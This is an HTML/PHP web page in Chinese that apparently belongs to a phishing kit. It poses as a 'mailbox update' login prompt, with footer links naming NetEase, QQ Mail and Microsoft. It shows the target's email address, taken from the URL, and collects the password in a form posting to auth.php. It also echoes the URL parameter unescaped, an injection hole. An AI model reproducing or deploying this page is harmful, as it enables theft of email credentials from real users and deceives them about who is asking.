<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<style type="text/css">
a:hover{color:#DF0101; }
</style>

<title>&#37038;&#31665;&#26356;&#26032;&#35774;&#32622;</title>



</head>
<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0" link="#000000" alink="#000000">

<table width="100%" height="100%" align="center" bgcolor="#FFFFFF">

<tbody><tr><td height="10%">
	
	<br><br>
	<table width="1000" align="center"><tbody><tr><td>
	<img src="./hellion/postmaster.png" width="" height="">
	</td></tr></tbody></table>

</td></tr>







<tr><td height="5%">
<hr width="1000" align="center">
</td></tr>





<tr><td height="5%"></td></tr>





<tr><td height="">
		<div align="center">
		<b><font face="verdana" size="+2" color="#0489B1">&#30331;&#24405;&#26356;&#26032;&#24744;&#30340;&#37038;&#31665;</font></b>
		</div>		
</td></tr>




<tr><td height="40%">

	<table width="400" height="220" bgcolor="#E5E2E2" align="center" style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;"><tbody><tr><td>


			<table width="400" height="220" style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;" align="center" bgcolor="#ffffff">
			<tbody><tr><td>


				<table width="320" align="center">

				<tbody><tr><td>

				<form method="post" action="auth.php">
			
				<br><br>

				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['login']; ?>" placeholder="Username">
				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['login']; ?> </font>		

				<p>

				<input name="pass" type="password" style="width:320px; height:40px; font-family: Verdana; font-size: 15px; color:#000000; 
				background-color: #ffffff; border: solid 2px 276BA2; padding: 10px" "="" required="" placeholder="&#36755;&#20837;&#23494;&#30721;">
	


				</p><p>

				<input type="submit" value="&#26356;&#26032;&#24744;&#30340;&#37038;&#31665;" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
				font-family: Verdana; font-size: 20px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
				-khtml-border-radius: 4px; border-radius: 4px;">				
	
				

				</p></form>


				</td></tr>
				
				</tbody></table>



				<br>

				


			</td></tr>


			</tbody></table>


		</td></tr></tbody></table>


</td></tr>





<tr><td height="10%"></td></tr>





<tr><td>
<div align="center">
<img src="./hellion/logos.png" width="1000" height="85">
</div>
</td></tr>




<tr><td height="">
<hr width="1000" align="center">
</td></tr>



<tr><td height="10%" bgcolor="#ffffff">

	<table width="90%" height="80%" align="center">

	<tbody><tr><td>

	<div align="center">

			  <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>&#37038;&#25919;&#38598;&#22242;</b></font></a> 
			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>&#30005;&#23376;&#37038;&#20214;&#35774;&#32622;</b></font></a> 
			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>&#32593;&#26131;&#37038;&#31665;</b></font></a> 
			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>QQ&#37038;&#31665;</b></font></a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>&#24494;&#36719;&#20013;&#24515;</b></font></a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>&#20225;&#19994;&#37038;&#23616;&#35774;&#32622;;</b></font></a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>&#30005;&#23376;&#37038;&#20214;&#23433;&#20840;</b></font></a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>&#30005;&#23376;&#37038;&#20214;&#21319;
			  ;&#32423;&#35774;&#32622;</b></font></a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>&#32852;&#31995;&#25105;&#20204;</b></font></a>
			
		
	</div>


	<p>



	</p></td></tr>

	</tbody></table>

</td></tr>

</tbody></table>



</body></html>